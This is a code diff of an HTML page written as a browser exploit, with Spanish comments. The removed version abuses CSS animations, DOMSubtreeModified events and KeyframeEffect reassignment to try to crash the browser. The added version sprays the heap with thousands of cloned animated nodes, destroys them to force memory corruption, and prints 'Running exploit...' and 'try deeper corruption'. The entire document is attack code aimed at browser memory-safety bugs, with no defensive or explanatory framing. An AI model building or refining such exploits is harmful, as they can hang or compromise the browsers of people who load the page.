@@ -2,56 +2,49 @@
 <html>
 <head>
 <style>
-@keyframes crash { from {} to {} }
-cite {
-  animation: crash 1ms infinite;
+@keyframes boom {
+  from { opacity: 1; }
+  to { opacity: 0; }
 }
 </style>
 </head>
-<body onload="main()">
-
-<object type="image/png">
-  <cite></cite>
-  <dl hidden></dl>
-</object>
+<body>
+<div id="log" style="color:white;background:#111;padding:1em;">Running exploit...</div>
 
 <script>
-const object = document.querySelector("object");
-const cite = document.querySelector("cite");
-const dl = document.querySelector("dl");
+let parent = document.createElement("div");
+document.body.appendChild(parent);
 
-function main() {
-  object.addEventListener("DOMSubtreeModified", onModify);
+let target = document.createElement("div");
+target.style.animation = "boom 0.1ms infinite";
+parent.appendChild(target);
 
-  // Forzar animación infinita sobre <cite>
-  cite.style.animationIterationCount = "infinite";
+let frame = 0;
 
-  // Cambiar el recurso para desencadenar el evento
-  object.data = "x";
-
-  // Iniciar bucle agresivo de reasignación
-  setInterval(() => {
+function sprayDOM() {
     try {
-      const anim = cite.getAnimations()[0];
-      if (anim) {
-        anim.effect = new KeyframeEffect(dl, {}, new AnimationEffectTiming());
-      }
-    } catch (e) {}
-  }, 1);
+        // Saturamos el heap con nodos animados
+        for (let i = 0; i < 1000; i++) {
+            let clone = target.cloneNode(true);
+            parent.appendChild(clone);
+        }
+
+        // Forzamos destrucción
+        while (parent.firstChild) {
+            parent.removeChild(parent.firstChild);
+        }
+    } catch (e) {
+        log.textContent = "❌ Error: " + e.message;
+    }
+
+    if (frame++ < 1000) {
+        requestAnimationFrame(sprayDOM);
+    } else {
+        log.textContent = "✅ No crash (try deeper corruption)";
+    }
 }
 
-function onModify() {
-  try {
-    object.width = "1em";
-    object.codeBase; // trigger legacy layout access
-    cite.style.animationDuration = Math.random() + "ms";
-  } catch (e) {}
-}
+requestAnimationFrame(sprayDOM);
 </script>
-
-<p style="color:white;background:#111;font-family:sans-serif;padding:1em;">
-  Si ves este mensaje y el navegador no se ha colgado, la prueba ha fallado.
-</p>
-
 </body>
 </html>
